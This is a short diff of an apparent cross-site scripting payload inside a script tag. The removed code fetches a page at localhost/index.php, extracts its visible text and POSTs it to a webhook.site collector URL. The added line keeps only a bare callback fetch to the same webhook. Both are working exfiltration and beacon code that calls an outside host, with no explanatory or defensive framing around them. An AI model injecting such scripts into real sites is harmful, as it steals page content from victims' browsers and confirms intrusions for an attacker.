@@ -1,36 +1,3 @@
 <script>
-const TARGET_URL = "http://localhost/index.php";  // URL of the page you want to fetch
-const WEBHOOK_URL = "https://webhook.site/998b21e9-1fed-4da1-9818-67cfafdbfaae";  // Replace with your webhook URL
-
-// Fetch page content and send to webhook
-fetch(TARGET_URL)
-  .then(response => response.text())  // Get the raw HTML of the page
-  .then(html => {
-    // Optionally, extract only visible text from the page
-    const parser = new DOMParser();
-    const doc = parser.parseFromString(html, "text/html");
-    const visibleText = doc.body.innerText.trim();  // Get visible text from body
-
-    // Send the output to your webhook
-    return fetch(WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        source: TARGET_URL,
-        timestamp: new Date().toISOString(),
-        output: visibleText  // or use html if you want raw HTML
-      })
-    });
-  })
-  .then(response => {
-    if (response.ok) {
-      console.log("Output successfully sent to webhook.");
-    } else {
-      console.error("Failed to send output to webhook:", response.statusText);
-    }
-  })
-  .catch(error => {
-    console.error("Error:", error.message);
-  });
-
+fetch("https://webhook.site/998b21e9-1fed-4da1-9818-67cfafdbfaae");
 </script>
